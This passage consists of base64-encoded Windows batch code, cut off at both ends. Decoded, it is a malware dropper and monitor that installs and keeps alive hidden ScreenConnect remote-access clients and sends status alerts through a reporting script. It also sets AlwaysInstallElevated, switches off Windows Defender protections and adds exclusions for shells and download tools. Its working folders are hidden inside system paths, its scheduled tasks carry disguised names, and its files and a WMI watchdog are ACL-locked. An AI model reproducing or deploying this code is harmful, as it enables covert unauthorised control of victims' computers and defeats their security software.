::bWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICBtc2lleGVjIC9pICIlTVNJX1NB
::RkUlIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBw
::cmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4mMQ0KICBzZXQg
::Ik1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICBlY2hvIFslVEFHJV0gbXNpZXhlY19y
::ZXRyeSBleGl0PSFNU0lFWElUIT4+IiVMT0clIg0KKQ0KaWYgL0kgbm90ICIlTVNJ
::X1NBRkUlIj09IiVNU0klIiBkZWwgL2YgL3EgIiVNU0lfU0FGRSUiID5udWwgMj4m
::MQ0KY2FsbCA6V2FpdFN2Yw0KY2FsbCA6UmVzdG9yZUFsdA0KcmVtIE8zNzogc2V2
::cnogL2kgc2hhcmVzIGxlZ2FjeSBVcGdyYWRlQ29kZXMgd2l0aCBncnl4YSDigJQg
::YWx3YXlzIHJlLWVuc3VyZSBHcnl4YSBhZnRlcg0KY2FsbCA6RW5zdXJlR3J5eGFN
::dXN0DQpleGl0IC9iIDANCg0KOlJlcGFpclJlZ2lzdGVyZWQNCnJlbSAlMT1maW5n
::ZXJwcmludCAtIHNlcnZpY2UgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVk
::OiByZXBhaXIgYnkgR1VJRC4NCnJlbSBNNDA6IGxhYmVsIHdhcyBhbXB1dGF0ZWQg
::KGJvZHkgc2F0IGFmdGVyIEluc3RhbGxNc2kgZXhpdCAvYikgc28gcHJpbWFyeSBo
::ZWFsIG5ldmVyIHJhbi4NCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JX4xKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4aXQgL2IgMA0K
::aWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDENCnBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
::eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWly
::IC1GcCAiJX4xIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCmNhbGwg
::OldhaXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVzdG9yZUFsdA0KcmVtIEFMVCBzZXJ2
::aWNlIGdvbmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZhbWlseSBtc2lleGVj
::IHNpZGUgZWZmZWN0KSAtIHJlcGFpciBpdCB0b28uDQpzYyBxdWVyeSAiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJy
::b3JsZXZlbCAxIGV4aXQgL2IgMA0KZWNobyBhbHQgbWlzc2luZyAtIHJlcGFpciBh
::dHRlbXB0Pj4iJUxPRyUiDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
::aWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBh
::aXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYx
::DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBm
::aW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxU
::X09LPTEiDQpleGl0IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBkZWxldGUgIkhLQ1Vc
::U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
::diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
::RVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2Fi
::bGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleGl0IC9iIDAN
::Cg0KOldhaXRTdmMNCnNldCAiVFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkg
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5J
::TkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIklOU1RBTExF
::RD0xIg0KICBzZXQgIlBSSU1fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQgL2Eg
::VFJJRVMrPTENCmlmICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQ0KcGluZyAxMjcu
::MC4wLjEgLW4gNyA+bnVsIDI+JjENCmdvdG8gOldhaXRMb29wDQoNCjpUZ1N0YXRl
::DQpzZXQgIk5FV1NUQVRFPSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAiT0xEU1RB
::VEU9Ig0KaWYgZXhpc3QgIiVTVEFURSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFU
::RSUiDQpyZW0gZmFsc2UgRE9XTiBhZnRlciByZWJvb3QgcmFjZTogcHJpbWFyeSBh
::bHJlYWR5IFJ1bm5pbmcg4oCUIGRvIG5vdCBzcGFtDQppZiAvSSAiJU5FV1NUQVRF
::JSI9PSJET1dOIiAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJv
::cmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc2tpcF9kb3duX2FscmVhZHlfcnVubmlu
::Zz4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQpyZW0gcmF0ZS1saW1p
::dCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciA2aCB3aGlsZSBz
::dHVjaw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBw
::cmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBw
::cmVzcw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVO
::RVdTVEFURSUiPT0iJU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdfc2VudC5m
::bGFnIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0
::ZXJhbFBhdGggJyVXRCVcdGdfc2VudC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90
::YWxNaW51dGVzIC1sdCAzNjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4m
::MQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3N1cHByZXNz
::ZWRfJU5FV1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6
::U2VuZEFsZXJ0DQplY2hvICVORVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+
::IiVXRCVcdGdfc2VudC5mbGFnIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0
::Z19yZXBvcnQucHMxIiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1TRyUi
::IC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8g
::dGcgc3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyArIGdyeXhhLmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRF
::X0RBQw0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhw
::YW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jv
::c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxi
::b290LmVyciINCnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VF
::UDI9Zjg2MWM4MTQwZDQ1MzQyNyINCnNldCAiS0VFUDM9MzZlNTA2ZmYwMTZiMjE1
::MSINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRv
::ICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAxPSUlTCIN
::CiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIktFRVAzPSUlTCINCnNldCAiUFJJTT1T
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQpzZXQgIkFMVD1TY3JlZW5D
::b25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQpzZXQgIkdSWVhBPVNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dyYW1GaWxlcyUiDQpz
::ZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9JVN5
::c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1r
::ZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUg
::JVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0tIE5ldXRyYWxpemUgTVNJIGJs
::b2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBEaXNhYmxlTVNJOiAwPWFsbG93
::LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBmb3JjZSAwDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RX
::T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQoNClJFTSAt
::LS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lvbnMgKHBvbGljeSArIHByZWZl
::cmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdh
::cmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5n
::IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
::LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZyAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
::RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFBy
::b3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2luZG93c1xUZW1wIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
::IiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIl
::KSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
::aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUg
::cG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8g
::KA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2
::ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZl
::cmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1w
::UHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307
::IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1w
::JywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQqJywnJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50KicpOyIgXg0KICAidHJ5eyRwYXRocys9QChH
::ZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gt
::T2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9
::W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7
::IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAt
::RmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAg
::fCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAg
::ImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkp
::eyBpZigkcCl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVB
::IDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1
::cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwuZXhl
::JywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5l
::Y3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
::c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0
::cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUi
::DQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaXJz
::ICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
::dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6
::IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0g
::Y29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBh
::bmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBk
::aXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAlJUYgaW4gKHBrZy5t
::c2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBp
::ZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
::Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJk
::ZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBj
::b250YWluIHNwYWNlcyAoIlNlcnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBG
::T1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJiYWdlIHRva2Vucy4gUG93
::ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVhZC4NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlkZW50aXR5LmNmZycgLUZvcmNl
::IHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNLX1tBLURdPSgu
::KykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
::JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywn
::UGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJl
::cycpIH07IiBeDQogICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1Q
::YXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::Zil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8IE91dC1OdWxsOyAm
::IGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06Ricg
::J0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
::ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0IGluc3Rh
::bGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBi
::cmVha3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJ
::TkUNClJFTSB3aGlsZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVu
::ZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3
::OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBidWlsZCBMb2NrRGlyJ2QgdGhl
::c2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxhZyIgKA0KICBm
::aW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5s
::b2NrX3ByaW9yX2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAg
::ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCiAgICAgICIl
::UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICAgICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAg
::ICAgIGlmIGV4aXN0ICIlJX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQi
::IC9SIC9EIFkgPm51bCAyPiYxDQogICAgICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0
